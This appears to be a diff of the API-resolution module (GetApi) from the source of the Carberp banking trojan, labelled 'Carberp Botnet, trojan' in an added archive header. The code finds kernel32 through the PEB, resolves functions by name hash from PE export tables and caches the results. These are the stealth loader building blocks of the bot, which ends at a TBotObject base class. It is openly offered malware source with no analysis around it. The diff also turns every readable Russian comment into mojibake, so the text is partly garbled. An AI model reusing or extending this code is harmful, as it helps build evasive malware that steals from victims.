@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "Getapi.h"
@@ -9,32 +20,32 @@
 
 
 //--------------------------------------------
-//  Глобальный блок памяти для кеширования
-// апи адресов
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------
 LPVOID* GlobalApiCache = NULL;
 
 //--------------------------------------------
-//  Адрес библиотеки ядра
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------
 HMODULE KernelModuleAddr = NULL;
 
 
 
 //--------------------------------------------------
-//  GetImageBase - Функция возвращает базовый
-//                 адрес загруженного образа
-//  ProcAddr - Адрес функции с которого начинается
-//             поиск. Если не указать, то будет
-//             использован адрес самой функции
+//  GetImageBase - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//                 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  ProcAddr - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//             пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//             пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
-//  Пример:
+//  пїЅпїЅпїЅпїЅпїЅпїЅ:
 //		DWORD Base = GetImageBase(&MyFunction);
 //--------------------------------------------------
 LPVOID WINAPI GetImageBase( LPVOID procAddr )
 {  
 	LPBYTE addr = (procAddr) ? (LPBYTE)procAddr : (LPBYTE)&GetImageBase;
-	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // Маска с расчётом на X86 и X64
+	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ X86 пїЅ X64
 	for(;;)
 	{
 		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)addr;
@@ -142,7 +153,7 @@ BOOL InitializeAPI()
     KernelModuleAddr = NULL;
 	GlobalApiCache = NULL;
 
-	// Инициализируем глобальный кэш
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	if (ApiCacheSize > 0)
 	{
 		DWORD BufSize = (ApiCacheSize + 1)*sizeof(LPVOID);
@@ -174,14 +185,14 @@ DWORD pGetLastError()
 
 
 //--------------------------------------------------
-//  GetPEB - Функция возвращает адрес структуры PEB
+//  GetPEB - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PEB
 //--------------------------------------------------
 LPVOID GetPEB()
 {
 	#ifdef _WIN64
 		return  (LPVOID)__readgsqword(0x60);
 	#else
-		// Для совместимости с Builder C++ x32 оставляем асм вставку
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Builder C++ x32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		LPVOID PEB;
 		__asm
 		{
@@ -194,7 +205,7 @@ LPVOID GetPEB()
 }
 
 //--------------------------------------------------
-//  GetKernel32 - Функция возвращает адрес
+//  GetKernel32 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //                kernel32.dll
 //--------------------------------------------------
 HMODULE GetKernel32(void)
@@ -230,8 +241,8 @@ HMODULE GetDllBase(DWORD DllHash)
 
 LPVOID GetForvardedProc(PCHAR Name)
 {
-	// Функция обработки переназначения экспорта
-	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DllName.ProcName пїЅпїЅпїЅ DllName.#ProcNomber
 	if (Name == NULL) return NULL;
 
 	char DLLName[255];
@@ -241,16 +252,16 @@ LPVOID GetForvardedProc(PCHAR Name)
 	if (!NameStr) return NULL;
 
 
-	// Собираем имя библиотеки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memcpy(DLLName, Name, NameStr - Name);
 
 	m_lstrcat(DLLName, ".dll");
 
-	// определяем имя функции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	NameStr++;
 	if (*NameStr == '#')
 	{
-		// Имя является номером функции
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		NameStr++;
 		DWORD OrdNomber = m_atoi(NameStr);
 		return GetProcAddressEx(DLLName, 0, OrdNomber);
@@ -262,26 +273,26 @@ LPVOID GetForvardedProc(PCHAR Name)
 
 LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
 {
-	/*----------- Функция возвращает адрем функции по её названию -----------*/
+	/*----------- пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ -----------*/
 
-    // Получаем адрес дополнительных PE заголовков
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PE пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)Module + ( (PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
 
-	// Получаем адрес таблицы експорта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
 
     DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
 
-	int Ordinal = -1; // Норем необходимой нам функции
+	int Ordinal = -1; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if ( HIWORD(ProcNameHash) == 0 )
 	{
-		// Ищем функцию по её номеру
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
 	}
 	else
 	{
-		// Ищем функцию по номеру
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PDWORD NamesTable  = (DWORD*)RVATOVA(Module, Table->AddressOfNames );
 		PWORD  OrdinalTable =  (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);
 
@@ -295,22 +306,22 @@ LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
 				Ordinal = *OrdinalTable;
 				break;
 			}
-			// Увеличиваем позицию в таблице
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			NamesTable++;
 			OrdinalTable++;
 		}
 	}
 
-	// не нашли номер
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Ordinal < 0)
 		return NULL;
 
-	// Определяем адрес функции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PDWORD AddrTable  = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
 	DWORD RVA		  = AddrTable[Ordinal];
 	DWORD Ret		  = (DWORD)RVATOVA(Module, RVA );
 
-	// проверяем на переназначение экспорта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Ret > (DWORD)Table && (Ret - (DWORD)Table < DataSize))
 		Ret = (DWORD)GetForvardedProc((PCHAR)Ret);
 
@@ -319,7 +330,7 @@ LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
 
 
 //---------------------------------------------------------------------
-//  GetDLLName -  Функция возвращает имя библиотеки
+//  GetDLLName -  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------
 
 namespace DLLS
@@ -400,7 +411,7 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 
 	PCHAR DllName = Dll;
 
-	// Адрес библиотеки ядра, получаем отдельно
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (dwModule == DLL_KERNEL32)
 		Module = GetKernel32();
 	else
@@ -431,11 +442,11 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 
 LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex)
 {
-	// Функция возвращает адрес функции используя кэш
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	LPVOID Addr = NULL;
 
 
-	// Пытаемся получить адрес из кэша
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 	bool UseCache = GlobalApiCache != NULL && CacheIndex > 0 && CacheIndex <= ApiCacheSize;
 
 	if (UseCache)
@@ -443,7 +454,7 @@ LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int C
 
 	if (!Addr)
 	{
-		// Функции нет в кэше. Получаем её адрес и добавляем в кэш
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 		Addr = GetProcAddressEx(Dll, dwModule, dwProcNameHash);
 		if (UseCache)
 			GlobalApiCache[CacheIndex] = Addr;
@@ -454,7 +465,7 @@ LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int C
 
 
 //****************************************************************
-//  TBotObject - базовый класс бота
+//  TBotObject - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //****************************************************************
 
 void* TBotObject::operator new(size_t size)
